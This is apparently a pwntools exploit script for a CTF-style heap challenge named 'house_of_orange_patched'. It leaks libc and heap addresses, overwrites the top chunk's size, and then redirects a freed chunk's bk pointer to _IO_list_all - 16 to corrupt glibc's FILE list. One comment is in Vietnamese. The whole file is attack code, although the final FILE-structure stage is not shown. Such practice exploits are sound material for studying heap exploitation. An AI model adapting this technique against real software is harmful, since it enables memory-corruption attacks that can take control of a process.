#!/usr/bin/env python3

from pwn import *

exe = ELF("./house_of_orange_patched")
libc = ELF("./libc.so.6")

context.binary = exe


gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''
def start():
    if args.GDB:
        return gdb.debug(exe.path, gdbscript=gs)
    else:
        return process(exe.path)

def small_malloc():
    p.send(b'1')
    p.recvuntil(b'> ')
def large_malloc():
    p.sendafter(b'> ',b'2')
def edit(data):
    p.send(b'3')
    p.sendafter(b'data: ',data)
    p.recvuntil(b'> ')

p = start()

p.recvuntil(b'puts() @')
libc.address = int(p.recvline()[:-1],16) - libc.sym.puts

p.recvuntil(b"heap @ ")
heap = int(p.recvline(), 16)
p.recvuntil(b"> ")
p.timeout = 0.1
input()
small_malloc()
edit(b'a'*24 + p64(0x1000-0x20+1))
large_malloc()
# ghi đè đoạn trên cùng cũ bằng cách trỏ "bk" của nó vào _IO_list_all - 16
edit(b"A"*24 + p64(0x21) + p64(0) + p64(libc.sym._IO_list_all - 16))

small_malloc()


p.interactive()

